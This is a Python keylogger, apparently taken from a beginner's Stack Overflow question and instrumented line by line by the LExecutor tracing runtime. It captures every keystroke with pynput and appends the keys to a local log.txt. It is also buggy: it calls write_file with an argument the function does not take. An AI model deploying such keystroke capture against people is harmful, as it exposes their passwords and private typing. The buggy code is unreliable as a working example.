# LExecutor: DO NOT INSTRUMENT

#Source: https://stackoverflow.com/questions/65651137/i-made-a-simple-keylogger-program-using-python-but-it-displays-typeerror-write
from lexecutor.Runtime import _n_
from lexecutor.Runtime import _a_
from lexecutor.Runtime import _c_
from lexecutor.Runtime import _l_
try:
    import pynput
    _l_(572638)

except ImportError:
    pass
try:
    from pynput.keyboard import Key, Listener
    _l_(572640)

except ImportError:
    pass

count = 0
_l_(572641)
keys = []
_l_(572642)

def on_press(key):
    _l_(572664)

    global keys, count
    _l_(572643)
    _c_(572647, _a_(572645, _n_(572644, "keys", lambda: keys), "append"), _n_(572646, "key", lambda: key))
    _l_(572648)
    count += 1
    _l_(572649)
    _c_(572654, _n_(572650, "print", lambda: print), _c_(572653, _a_(572651, "{0} pressed", "format"), _n_(572652, "key", lambda: key)))
    _l_(572655)

    if _n_(572656, "count", lambda: count) >= 10:
        _l_(572663)

        count = 0
        _l_(572657)
        _c_(572660, _n_(572658, "write_file", lambda: write_file), _n_(572659, "key", lambda: key))
        _l_(572661)
        keys = []
        _l_(572662)

def write_file():
    _l_(572700)

    with _c_(572666, _n_(572665, "open", lambda: open), "log.txt", "a") as f:
        _l_(572699)

        for key in _n_(572667, "keys", lambda: keys):
            _l_(572698)

            k = _c_(572672, _a_(572671, _c_(572670, _n_(572668, "str", lambda: str), _n_(572669, "key", lambda: key)), "replace"), "'","")
            _l_(572673)
            if _c_(572676, _a_(572675, _n_(572674, "k", lambda: k), "find"), "space") > 0:
                _l_(572690)

                _c_(572679, _a_(572678, _n_(572677, "f", lambda: f), "write"), "\n")
                _l_(572680)
            elif _c_(572683, _a_(572682, _n_(572681, "k", lambda: k), "find"), "Key") == -1:
                _l_(572689)

                _c_(572687, _a_(572685, _n_(572684, "f", lambda: f), "write"), _n_(572686, "k", lambda: k))
                _l_(572688)
            _c_(572696, _a_(572692, _n_(572691, "f", lambda: f), "write"), _c_(572695, _n_(572693, "str", lambda: str), _n_(572694, "key", lambda: key)))
            _l_(572697)

def on_release(key):
    _l_(572706)

    if _n_(572701, "key", lambda: key) == _a_(572703, _n_(572702, "Key", lambda: Key), "esc"):
        _l_(572705)

        aux = False
        _l_(572704)
        return aux


with _c_(572710, _n_(572707, "Listener", lambda: Listener), on_press=_n_(572708, "on_press", lambda: on_press), on_release=_n_(572709, "on_release", lambda: on_release)) as listener:
    _l_(572715)

    _c_(572713, _a_(572712, _n_(572711, "listener", lambda: listener), "join"))
    _l_(572714)